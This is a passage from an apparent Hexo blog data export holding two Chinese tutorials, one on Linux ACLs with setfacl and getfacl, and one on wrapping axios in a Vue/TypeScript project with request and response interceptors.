href=\"#setfacl-命令\" class=\"headerlink\" title=\"setfacl 命令\"></a>setfacl 命令</h3><p>setfacl命令用于管理文件的ACL规则，格式为“setfacl [参数] 文件名称”。</p>\n<p>文件的ACL提供的是在所有者、所属组、其他人的读/写/执行权限之外的特殊权限控制，使用setfacl命令可以针对单一用户或用户组、单一文件或目录来进行读/写/执行权限的控制。</p>\n<p>其中，针对目录文件需要使用-R递归参数；针对普通文件则使用-m参数；如果想要删除某个文件的ACL，则可以使用-b参数。</p>\n<p>设置用户在/root目录上的权限：</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root<span class=\"variable\">@linuxprobe</span> ~]<span class=\"comment\"># setfacl -Rm u:linuxprobe:rwx /root</span></span><br><span class=\"line\">[root<span class=\"variable\">@linuxprobe</span> ~]<span class=\"comment\"># su - linuxprobe</span></span><br><span class=\"line\">Last <span class=\"symbol\">login:</span> Sat Mar <span class=\"number\">21</span> <span class=\"number\">15</span><span class=\"symbol\">:</span><span class=\"number\">45</span><span class=\"symbol\">:</span><span class=\"number\">03</span> CST <span class=\"number\">2017</span> on pts/<span class=\"number\">1</span></span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> ~]<span class=\"variable\">$ </span>cd /root</span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> root]<span class=\"variable\">$ </span>ls</span><br><span class=\"line\">anaconda-ks.cfg Downloads Pictures Public</span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> root]<span class=\"variable\">$ </span>cat anaconda-ks.cfg</span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> root]<span class=\"variable\">$ </span>exit</span><br></pre></td></tr></table></figure>\n<p>常用的ls命令是看不到ACL表信息的，但是却可以看到文件的权限最后一个点（.）变成了加号（+）,这就意味着该文件已经设置了ACL了。</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@linuxprobe ~]# ls -ld /root</span><br><span class=\"line\">dr-xrwx---+ <span class=\"number\">14</span> root root <span class=\"number\">4096</span> May <span class=\"number\">4</span> <span class=\"number\">2017</span> /root</span><br></pre></td></tr></table></figure>\n<h3 id=\"getfacl-命令\"><a href=\"#getfacl-命令\" class=\"headerlink\" title=\"getfacl 命令\"></a>getfacl 命令</h3><p>getfacl命令用于显示文件上设置的ACL信息，格式为“getfacl 文件名称”。</p>\n<p>想要设置ACL，用的是setfacl命令；要想查看ACL，则用的是getfacl命令。</p>\n<p>使用getfacl命令显示在root管理员家目录上设置的所有ACL信息。</p>\n<figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@linuxprobe ~]<span class=\"meta\"># getfacl /root</span></span><br><span class=\"line\"><span class=\"symbol\">getfacl:</span> Removing leading <span class=\"string\">'/'</span> from absolute path names</span><br><span class=\"line\"><span class=\"meta\"># file: root</span></span><br><span class=\"line\"><span class=\"meta\"># owner: root</span></span><br><span class=\"line\"><span class=\"meta\"># group: root</span></span><br><span class=\"line\"><span class=\"symbol\">user:</span>:r-<span class=\"built_in\">x</span></span><br><span class=\"line\"><span class=\"symbol\">user:</span>linuxprobe:rwx</span><br><span class=\"line\"><span class=\"symbol\">group:</span>:r-<span class=\"built_in\">x</span></span><br><span class=\"line\"><span class=\"symbol\">mask:</span>:rwx</span><br><span class=\"line\"><span class=\"symbol\">other:</span>:---</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>如果希望对某个指定的用户进行单独的权限控制，就需要用到文件的访问控制列表（ACL）了。通俗来讲，基于普通文件或目录设置ACL其实就是针对指定的用户或用户组设置文件或目录的操作权限。另外，如果针对某个目录设置了ACL，则目录中的文件会继承其ACL；若针对文件设置了ACL，则文件不再继承其所在目录的ACL。</p>","more":"<h3 id=\"setfacl-命令\"><a href=\"#setfacl-命令\" class=\"headerlink\" title=\"setfacl 命令\"></a>setfacl 命令</h3><p>setfacl命令用于管理文件的ACL规则，格式为“setfacl [参数] 文件名称”。</p>\n<p>文件的ACL提供的是在所有者、所属组、其他人的读/写/执行权限之外的特殊权限控制，使用setfacl命令可以针对单一用户或用户组、单一文件或目录来进行读/写/执行权限的控制。</p>\n<p>其中，针对目录文件需要使用-R递归参数；针对普通文件则使用-m参数；如果想要删除某个文件的ACL，则可以使用-b参数。</p>\n<p>设置用户在/root目录上的权限：</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root<span class=\"variable\">@linuxprobe</span> ~]<span class=\"comment\"># setfacl -Rm u:linuxprobe:rwx /root</span></span><br><span class=\"line\">[root<span class=\"variable\">@linuxprobe</span> ~]<span class=\"comment\"># su - linuxprobe</span></span><br><span class=\"line\">Last <span class=\"symbol\">login:</span> Sat Mar <span class=\"number\">21</span> <span class=\"number\">15</span><span class=\"symbol\">:</span><span class=\"number\">45</span><span class=\"symbol\">:</span><span class=\"number\">03</span> CST <span class=\"number\">2017</span> on pts/<span class=\"number\">1</span></span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> ~]<span class=\"variable\">$ </span>cd /root</span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> root]<span class=\"variable\">$ </span>ls</span><br><span class=\"line\">anaconda-ks.cfg Downloads Pictures Public</span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> root]<span class=\"variable\">$ </span>cat anaconda-ks.cfg</span><br><span class=\"line\">[linuxprobe<span class=\"variable\">@linuxprobe</span> root]<span class=\"variable\">$ </span>exit</span><br></pre></td></tr></table></figure>\n<p>常用的ls命令是看不到ACL表信息的，但是却可以看到文件的权限最后一个点（.）变成了加号（+）,这就意味着该文件已经设置了ACL了。</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@linuxprobe ~]# ls -ld /root</span><br><span class=\"line\">dr-xrwx---+ <span class=\"number\">14</span> root root <span class=\"number\">4096</span> May <span class=\"number\">4</span> <span class=\"number\">2017</span> /root</span><br></pre></td></tr></table></figure>\n<h3 id=\"getfacl-命令\"><a href=\"#getfacl-命令\" class=\"headerlink\" title=\"getfacl 命令\"></a>getfacl 命令</h3><p>getfacl命令用于显示文件上设置的ACL信息，格式为“getfacl 文件名称”。</p>\n<p>想要设置ACL，用的是setfacl命令；要想查看ACL，则用的是getfacl命令。</p>\n<p>使用getfacl命令显示在root管理员家目录上设置的所有ACL信息。</p>\n<figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@linuxprobe ~]<span class=\"meta\"># getfacl /root</span></span><br><span class=\"line\"><span class=\"symbol\">getfacl:</span> Removing leading <span class=\"string\">'/'</span> from absolute path names</span><br><span class=\"line\"><span class=\"meta\"># file: root</span></span><br><span class=\"line\"><span class=\"meta\"># owner: root</span></span><br><span class=\"line\"><span class=\"meta\"># group: root</span></span><br><span class=\"line\"><span class=\"symbol\">user:</span>:r-<span class=\"built_in\">x</span></span><br><span class=\"line\"><span class=\"symbol\">user:</span>linuxprobe:rwx</span><br><span class=\"line\"><span class=\"symbol\">group:</span>:r-<span class=\"built_in\">x</span></span><br><span class=\"line\"><span class=\"symbol\">mask:</span>:rwx</span><br><span class=\"line\"><span class=\"symbol\">other:</span>:---</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"Vue 中 axios 的封装","abbrlink":11917,"_content":"\n### 前言\n\n虽然，axios 是个优秀的 HTTP 库，但是，直接在项目中使用并不是那么方便，所以，我们需要对其进行一定程度上的配置封装，减少重复代码，方便调用。\n\n<!--more-->\n\n### 开始\n\n其实，网上关于 axios 封装的代码不少，但是大部分都是在入口文件（main.js）中进行 axios 全局对象属性定义的形式进行配置，类似于如下代码：\n\n```\naxios.defaults.timeout = 10000\n\n```\n\n该方案有两个不足，首先，axios 封装代码耦合进入入口文件，不方便后期维护；其次，使用 axios 全局对象属性定义的方式进行配置，代码过于零散。\n\n针对问题一，我使用了 Vue 源码结构中的一大核心思想——将功能拆分为文件，方便后期的维护。单独创建一个 `http.js` 或者 `http.ts` 文件，在文件中引入 axios 并对其进行封装配置，最后将其导出并挂载到 Vue 的原型上即可。此时，每次修改 axios 配置，只需要修改对应的文件即可，不会影响到不相关的功能。\n\n针对问题二，采用 axios 官方推荐的，通过配置项创建 axios 实例的方式进行配置封装。\n\n代码如下：\n\n```\n// http.js\nimport axios from 'axios'\n// 创建 axios 实例\nconst service = axios.create({\n  // 配置项\n})\n\n```\n\n### 根据环境设置 baseURL\n\nbaseURL 属性是请求地址前缀，将自动加在 url 前面，除非 url 是个绝对地址。正常情况下，在开发环境下和生产模式下有着不同的 baseURL，所以，我们需要根据不同的环境切换不同的 baseURL。\n\n在开发模式下，由于有着 devServer 的存在，需要根据固定的 url 前缀进行请求地址重写，所以，在开发环境下，将 baseURL 设为某个固定的值，比如：`/apis`。\n\n在生产模式下，根据 Java 模块的请求前缀的不同，可以设置不同的 baseURL。\n\n具体代码如下：\n\n```\n// 根据 process.env.NODE_ENV 区分状态，切换不同的 baseURL\nconst service = axios.create({\n\tbaseURL: process.env.NODE_ENV === 'production' ? `/java` : '/apis',\n})\n\n```\n\n### 统一设置请求头\n\n在这里和大家聊一个问题，什么是封装？在我看来，封装是通过更少的调用代码覆盖更多的调用场景。\n\n由于，大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，所以，在这里，我采用的方案是，将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置。\n\n代码如下：\n\n```\nconst service = axios.create({\n    ...\n\theaders: {\n        get: {\n          'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'\n          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来\n        },\n        post: {\n          'Content-Type': 'application/json;charset=utf-8'\n          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来\n        }\n  },\n})\n\n```\n\n### 跨域、超时、响应码处理\n\naxios 中，提供是否允许跨域的属性——withCredentials，以及配置超时时间的属性——timeout，通过这两个属性，可以轻松处理跨域和超时的问题。\n\n下面，我们来说说响应码处理：\n\naxios 提供了 validateStatus 属性，用于定义对于给定的 HTTP 响应状态码是 resolve 或 reject promise。所以，正常设置的情况下，我们会将状态码为 2 系列或者 304 的请求设为 resolve 状态，其余为 reject 状态。结果就是，我们可以在业务代码里，使用 catch 统一捕获响应错误的请求，从而进行统一处理。\n\n但是，由于我在代码里面使用了 async-await，而众所周知，async-await 捕获 catch 的方式极为麻烦，所以，在此处，我选择将所有响应都设为 resolve 状态，统一在 then 处理。\n\n此部分代码如下：\n\n```\nconst service = axios.create({\n\t// 跨域请求时是否需要使用凭证\n\twithCredentials: true,\n    // 请求 30s 超时\n\ttimeout: 30000,\n\tvalidateStatus: function () {\n\t\t// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常\n\t\treturn true\n\t},\n})\n\n```\n\n### 请求、响应处理\n\n在不使用 axios 的情况下，每次请求或者接受响应，都需要将请求或者响应序列化。\n\n而在 axios 中， `transformRequest` 允许在向服务器发送请求前，修改请求数据；`transformResponse` 在传递给 then/catch 前，允许修改响应数据。\n\n通过这两个钩子，可以省去大量重复的序列化代码。\n\n代码如下：\n\n```\nconst service = axios.create({\n    // 在向服务器发送请求前，序列化请求数据\n    transformRequest: [function (data) {\n        data = JSON.stringify(data)\n        return data\n    }],\n    // 在传递给 then/catch 前，修改响应数据\n    transformResponse: [function (data) {\n        if (typeof data === 'string' && data.startsWith('{')) {\n            data = JSON.parse(data)\n        }\n        return data\n    }]\n})\n\n```\n\n### 拦截器\n\n拦截器，分为请求拦截器以及响应拦截器，分别在请求或响应被 then 或 catch 处理前拦截它们。\n\n之前提到过，由于 async-await 中 catch 难以处理的问题，所以将出错的情况也作为 resolve 状态进行处理。但这带来了一个问题，请求或响应出错的情况下，结果没有数据协议中定义的 msg 字段（消息）。所以，我们需要在出错的时候，手动生成一个符合返回格式的返回数据。\n\n由于，在业务中，没有需要在请求拦截器中做额外处理的需求，所以，请求拦截器的 resolve 状态，只需直接返回就可以了。\n\n请求拦截器代码如下：\n\n```\n// 请求拦截器\nservice.interceptors.request.use((config) => {\n\treturn config\n}, (error) => {\n\t// 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '服务器异常，请联系管理员！'\n    return Promise.resolve(error)\n})\n\n```\n\n再来聊聊响应拦截器，还是之前的那个问题，除了请求或响应错误，还有一种情况也会导致返回的消息体不符合协议规范，那就是状态码不为 2 系列或 304 时。此时，我们还是需要做一样的处理——手动生成一个符合返回格式的返回数据。但是，有一点不一样，我们还需要根据不同的状态码生成不同的提示信息，以方便处理上线后的问题。\n\n响应拦截器代码如下：\n\n```\n// 根据不同的状态码，生成不同的提示信息\nconst showStatus = (status) => {\n    let message = ''\n    // 这一坨代码可以使用策略模式进行优化\n    switch (status) {\n        case 400:\n            message = '请求错误(400)'\n            break\n        case 401:\n            message = '未授权，请重新登录(401)'\n            break\n        case 403:\n            message = '拒绝访问(403)'\n            break\n        case 404:\n            message = '请求出错(404)'\n            break\n        case 408:\n            message = '请求超时(408)'\n            break\n        case 500:\n            message = '服务器错误(500)'\n            break\n        case 501:\n            message = '服务未实现(501)'\n            break\n        case 502:\n            message = '网络错误(502)'\n            break\n        case 503:\n            message = '服务不可用(503)'\n            break\n        case 504:\n            message = '网络超时(504)'\n            break\n        case 505:\n            message = 'HTTP版本不受支持(505)'\n            break\n        default:\n            message = `连接出错(${status})!`\n    }\n    return `${message}，请检查网络或联系管理员！`\n}\n\n// 响应拦截器\nservice.interceptors.response.use((response) => {\n    const status = response.status\n    let msg = ''\n    if (status < 200 || status >= 300) {\n        // 处理http错误，抛到业务代码\n        msg = showStatus(status)\n        if (typeof response.data === 'string') {\n            response.data = { msg }\n        } else {\n            response.data.msg = msg\n        }\n    }\n    return response\n}, (error) => {\n    // 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '请求超时或服务器异常，请检查网络或联系管理员！'\n    return Promise.resolve(error)\n})\n\n```\n\n_tips1：友情提示，上面那一坨 switch-case 代码，可以使用策略模式进行优化~_\n\n_tips2：如果有一些业务相关的需求，可以加在拦截器中，比如：loading、鉴权等~_\n\n### 支持 TypeScript\n\n由于前段时间，我在部门内推了 TypeScript，为了满足自己的强迫症，将所有 js 文件改写为了 ts 文件。由于 axios 本身有 TypeScript 相关的支持，所以只需要把对应的类型导入，然后赋值即可。\n\n### 完整代码\n\n```\n// http.ts\nimport axios, { AxiosRequestConfig, AxiosResponse } from 'axios'\n\nconst showStatus = (status: number) => {\n  let message = ''\n  switch (status) {\n    case 400:\n      message = '请求错误(400)'\n      break\n    case 401:\n      message = '未授权，请重新登录(401)'\n      break\n    case 403:\n      message = '拒绝访问(403)'\n      break\n    case 404:\n      message = '请求出错(404)'\n      break\n    case 408:\n      message = '请求超时(408)'\n      break\n    case 500:\n      message = '服务器错误(500)'\n      break\n    case 501:\n      message = '服务未实现(501)'\n      break\n    case 502:\n      message = '网络错误(502)'\n      break\n    case 503:\n      message = '服务不可用(503)'\n      break\n    case 504:\n      message = '网络超时(504)'\n      break\n    case 505:\n      message = 'HTTP版本不受支持(505)'\n      break\n    default:\n      message = `连接出错(${status})!`\n  }\n  return `${message}，请检查网络或联系管理员！`\n}\n\nconst service = axios.create({\n  // 联调\n  baseURL: process.env.NODE_ENV === 'production' ? `/` : '/apis',\n  headers: {\n    get: {\n      'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'\n    },\n    post: {\n      'Content-Type': 'application/json;charset=utf-8'\n    }\n  },\n  // 是否跨站点访问控制请求\n  withCredentials: true,\n  timeout: 30000,\n  transformRequest: [(data) => {\n    data = JSON.stringify(data)\n    return data\n  }],\n  validateStatus () {\n    // 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常\n    return true\n  },\n  transformResponse: [(data) => {\n    if (typeof data === 'string' && data.startsWith('{')) {\n      data = JSON.parse(data)\n    }\n    return data\n  }]\n})\n\n// 请求拦截器\nservice.interceptors.request.use((config: AxiosRequestConfig) => {\n    return config\n}, (error) => {\n    // 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '服务器异常，请联系管理员！'\n    return Promise.resolve(error)\n})\n\n// 响应拦截器\nservice.interceptors.response.use((response: AxiosResponse) => {\n    const status = response.status\n    let msg = ''\n    if (status < 200 || status >= 300) {\n        // 处理http错误，抛到业务代码\n        msg = showStatus(status)\n        if (typeof response.data === 'string') {\n            response.data = {msg}\n        } else {\n            response.data.msg = msg\n        }\n    }\n    return response\n}, (error) => {\n    // 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '请求超时或服务器异常，请检查网络或联系管理员！'\n    return Promise.resolve(error)\n})\n\nexport default service\n\n```","source":"_posts/2019/11/Vue 中 axios 的封装.md","raw":"---\nlayout: post\ntitle: Vue 中 axios 的封装\ntags:\n  - vue\ncategories:\n  - vue\nabbrlink: 11917\n---\n\n### 前言\n\n虽然，axios 是个优秀的 HTTP 库，但是，直接在项目中使用并不是那么方便，所以，我们需要对其进行一定程度上的配置封装，减少重复代码，方便调用。\n\n<!--more-->\n\n### 开始\n\n其实，网上关于 axios 封装的代码不少，但是大部分都是在入口文件（main.js）中进行 axios 全局对象属性定义的形式进行配置，类似于如下代码：\n\n```\naxios.defaults.timeout = 10000\n\n```\n\n该方案有两个不足，首先，axios 封装代码耦合进入入口文件，不方便后期维护；其次，使用 axios 全局对象属性定义的方式进行配置，代码过于零散。\n\n针对问题一，我使用了 Vue 源码结构中的一大核心思想——将功能拆分为文件，方便后期的维护。单独创建一个 `http.js` 或者 `http.ts` 文件，在文件中引入 axios 并对其进行封装配置，最后将其导出并挂载到 Vue 的原型上即可。此时，每次修改 axios 配置，只需要修改对应的文件即可，不会影响到不相关的功能。\n\n针对问题二，采用 axios 官方推荐的，通过配置项创建 axios 实例的方式进行配置封装。\n\n代码如下：\n\n```\n// http.js\nimport axios from 'axios'\n// 创建 axios 实例\nconst service = axios.create({\n  // 配置项\n})\n\n```\n\n### 根据环境设置 baseURL\n\nbaseURL 属性是请求地址前缀，将自动加在 url 前面，除非 url 是个绝对地址。正常情况下，在开发环境下和生产模式下有着不同的 baseURL，所以，我们需要根据不同的环境切换不同的 baseURL。\n\n在开发模式下，由于有着 devServer 的存在，需要根据固定的 url 前缀进行请求地址重写，所以，在开发环境下，将 baseURL 设为某个固定的值，比如：`/apis`。\n\n在生产模式下，根据 Java 模块的请求前缀的不同，可以设置不同的 baseURL。\n\n具体代码如下：\n\n```\n// 根据 process.env.NODE_ENV 区分状态，切换不同的 baseURL\nconst service = axios.create({\n\tbaseURL: process.env.NODE_ENV === 'production' ? `/java` : '/apis',\n})\n\n```\n\n### 统一设置请求头\n\n在这里和大家聊一个问题，什么是封装？在我看来，封装是通过更少的调用代码覆盖更多的调用场景。\n\n由于，大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，所以，在这里，我采用的方案是，将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置。\n\n代码如下：\n\n```\nconst service = axios.create({\n    ...\n\theaders: {\n        get: {\n          'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'\n          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来\n        },\n        post: {\n          'Content-Type': 'application/json;charset=utf-8'\n          // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来\n        }\n  },\n})\n\n```\n\n### 跨域、超时、响应码处理\n\naxios 中，提供是否允许跨域的属性——withCredentials，以及配置超时时间的属性——timeout，通过这两个属性，可以轻松处理跨域和超时的问题。\n\n下面，我们来说说响应码处理：\n\naxios 提供了 validateStatus 属性，用于定义对于给定的 HTTP 响应状态码是 resolve 或 reject promise。所以，正常设置的情况下，我们会将状态码为 2 系列或者 304 的请求设为 resolve 状态，其余为 reject 状态。结果就是，我们可以在业务代码里，使用 catch 统一捕获响应错误的请求，从而进行统一处理。\n\n但是，由于我在代码里面使用了 async-await，而众所周知，async-await 捕获 catch 的方式极为麻烦，所以，在此处，我选择将所有响应都设为 resolve 状态，统一在 then 处理。\n\n此部分代码如下：\n\n```\nconst service = axios.create({\n\t// 跨域请求时是否需要使用凭证\n\twithCredentials: true,\n    // 请求 30s 超时\n\ttimeout: 30000,\n\tvalidateStatus: function () {\n\t\t// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常\n\t\treturn true\n\t},\n})\n\n```\n\n### 请求、响应处理\n\n在不使用 axios 的情况下，每次请求或者接受响应，都需要将请求或者响应序列化。\n\n而在 axios 中， `transformRequest` 允许在向服务器发送请求前，修改请求数据；`transformResponse` 在传递给 then/catch 前，允许修改响应数据。\n\n通过这两个钩子，可以省去大量重复的序列化代码。\n\n代码如下：\n\n```\nconst service = axios.create({\n    // 在向服务器发送请求前，序列化请求数据\n    transformRequest: [function (data) {\n        data = JSON.stringify(data)\n        return data\n    }],\n    // 在传递给 then/catch 前，修改响应数据\n    transformResponse: [function (data) {\n        if (typeof data === 'string' && data.startsWith('{')) {\n            data = JSON.parse(data)\n        }\n        return data\n    }]\n})\n\n```\n\n### 拦截器\n\n拦截器，分为请求拦截器以及响应拦截器，分别在请求或响应被 then 或 catch 处理前拦截它们。\n\n之前提到过，由于 async-await 中 catch 难以处理的问题，所以将出错的情况也作为 resolve 状态进行处理。但这带来了一个问题，请求或响应出错的情况下，结果没有数据协议中定义的 msg 字段（消息）。所以，我们需要在出错的时候，手动生成一个符合返回格式的返回数据。\n\n由于，在业务中，没有需要在请求拦截器中做额外处理的需求，所以，请求拦截器的 resolve 状态，只需直接返回就可以了。\n\n请求拦截器代码如下：\n\n```\n// 请求拦截器\nservice.interceptors.request.use((config) => {\n\treturn config\n}, (error) => {\n\t// 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '服务器异常，请联系管理员！'\n    return Promise.resolve(error)\n})\n\n```\n\n再来聊聊响应拦截器，还是之前的那个问题，除了请求或响应错误，还有一种情况也会导致返回的消息体不符合协议规范，那就是状态码不为 2 系列或 304 时。此时，我们还是需要做一样的处理——手动生成一个符合返回格式的返回数据。但是，有一点不一样，我们还需要根据不同的状态码生成不同的提示信息，以方便处理上线后的问题。\n\n响应拦截器代码如下：\n\n```\n// 根据不同的状态码，生成不同的提示信息\nconst showStatus = (status) => {\n    let message = ''\n    // 这一坨代码可以使用策略模式进行优化\n    switch (status) {\n        case 400:\n            message = '请求错误(400)'\n            break\n        case 401:\n            message = '未授权，请重新登录(401)'\n            break\n        case 403:\n            message = '拒绝访问(403)'\n            break\n        case 404:\n            message = '请求出错(404)'\n            break\n        case 408:\n            message = '请求超时(408)'\n            break\n        case 500:\n            message = '服务器错误(500)'\n            break\n        case 501:\n            message = '服务未实现(501)'\n            break\n        case 502:\n            message = '网络错误(502)'\n            break\n        case 503:\n            message = '服务不可用(503)'\n            break\n        case 504:\n            message = '网络超时(504)'\n            break\n        case 505:\n            message = 'HTTP版本不受支持(505)'\n            break\n        default:\n            message = `连接出错(${status})!`\n    }\n    return `${message}，请检查网络或联系管理员！`\n}\n\n// 响应拦截器\nservice.interceptors.response.use((response) => {\n    const status = response.status\n    let msg = ''\n    if (status < 200 || status >= 300) {\n        // 处理http错误，抛到业务代码\n        msg = showStatus(status)\n        if (typeof response.data === 'string') {\n            response.data = { msg }\n        } else {\n            response.data.msg = msg\n        }\n    }\n    return response\n}, (error) => {\n    // 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '请求超时或服务器异常，请检查网络或联系管理员！'\n    return Promise.resolve(error)\n})\n\n```\n\n_tips1：友情提示，上面那一坨 switch-case 代码，可以使用策略模式进行优化~_\n\n_tips2：如果有一些业务相关的需求，可以加在拦截器中，比如：loading、鉴权等~_\n\n### 支持 TypeScript\n\n由于前段时间，我在部门内推了 TypeScript，为了满足自己的强迫症，将所有 js 文件改写为了 ts 文件。由于 axios 本身有 TypeScript 相关的支持，所以只需要把对应的类型导入，然后赋值即可。\n\n### 完整代码\n\n```\n// http.ts\nimport axios, { AxiosRequestConfig, AxiosResponse } from 'axios'\n\nconst showStatus = (status: number) => {\n  let message = ''\n  switch (status) {\n    case 400:\n      message = '请求错误(400)'\n      break\n    case 401:\n      message = '未授权，请重新登录(401)'\n      break\n    case 403:\n      message = '拒绝访问(403)'\n      break\n    case 404:\n      message = '请求出错(404)'\n      break\n    case 408:\n      message = '请求超时(408)'\n      break\n    case 500:\n      message = '服务器错误(500)'\n      break\n    case 501:\n      message = '服务未实现(501)'\n      break\n    case 502:\n      message = '网络错误(502)'\n      break\n    case 503:\n      message = '服务不可用(503)'\n      break\n    case 504:\n      message = '网络超时(504)'\n      break\n    case 505:\n      message = 'HTTP版本不受支持(505)'\n      break\n    default:\n      message = `连接出错(${status})!`\n  }\n  return `${message}，请检查网络或联系管理员！`\n}\n\nconst service = axios.create({\n  // 联调\n  baseURL: process.env.NODE_ENV === 'production' ? `/` : '/apis',\n  headers: {\n    get: {\n      'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'\n    },\n    post: {\n      'Content-Type': 'application/json;charset=utf-8'\n    }\n  },\n  // 是否跨站点访问控制请求\n  withCredentials: true,\n  timeout: 30000,\n  transformRequest: [(data) => {\n    data = JSON.stringify(data)\n    return data\n  }],\n  validateStatus () {\n    // 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常\n    return true\n  },\n  transformResponse: [(data) => {\n    if (typeof data === 'string' && data.startsWith('{')) {\n      data = JSON.parse(data)\n    }\n    return data\n  }]\n})\n\n// 请求拦截器\nservice.interceptors.request.use((config: AxiosRequestConfig) => {\n    return config\n}, (error) => {\n    // 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '服务器异常，请联系管理员！'\n    return Promise.resolve(error)\n})\n\n// 响应拦截器\nservice.interceptors.response.use((response: AxiosResponse) => {\n    const status = response.status\n    let msg = ''\n    if (status < 200 || status >= 300) {\n        // 处理http错误，抛到业务代码\n        msg = showStatus(status)\n        if (typeof response.data === 'string') {\n            response.data = {msg}\n        } else {\n            response.data.msg = msg\n        }\n    }\n    return response\n}, (error) => {\n    // 错误抛到业务代码\n    error.data = {}\n    error.data.msg = '请求超时或服务器异常，请检查网络或联系管理员！'\n    return Promise.resolve(error)\n})\n\nexport default service\n\n```","slug":"2019/11/Vue 中 axios 的封装","published":1,"date":"2019-11-18T05:48:54.400Z","updated":"2020-04-12T06:34:43.617Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzb000844vq64v48ly5","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>虽然，axios 是个优秀的 HTTP 库，但是，直接在项目中使用并不是那么方便，所以，我们需要对其进行一定程度上的配置封装，减少重复代码，方便调用。</p>\n<a id=\"more\"></a>\n<h3 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h3><p>其实，网上关于 axios 封装的代码不少，但是大部分都是在入口文件（main.js）中进行 axios 全局对象属性定义的形式进行配置，类似于如下代码：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios<span class=\"selector-class\">.defaults</span><span class=\"selector-class\">.timeout</span> = <span class=\"number\">10000</span></span><br></pre></td></tr></table></figure>\n<p>该方案有两个不足，首先，axios 封装代码耦合进入入口文件，不方便后期维护；其次，使用 axios 全局对象属性定义的方式进行配置，代码过于零散。</p>\n<p>针对问题一，我使用了 Vue 源码结构中的一大核心思想——将功能拆分为文件，方便后期的维护。单独创建一个 <code>http.js</code> 或者 <code>http.ts</code> 文件，在文件中引入 axios 并对其进行封装配置，最后将其导出并挂载到 Vue 的原型上即可。此时，每次修改 axios 配置，只需要修改对应的文件即可，不会影响到不相关的功能。</p>\n<p>针对问题二，采用 axios 官方推荐的，通过配置项创建 axios 实例的方式进行配置封装。</p>\n<p>代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td 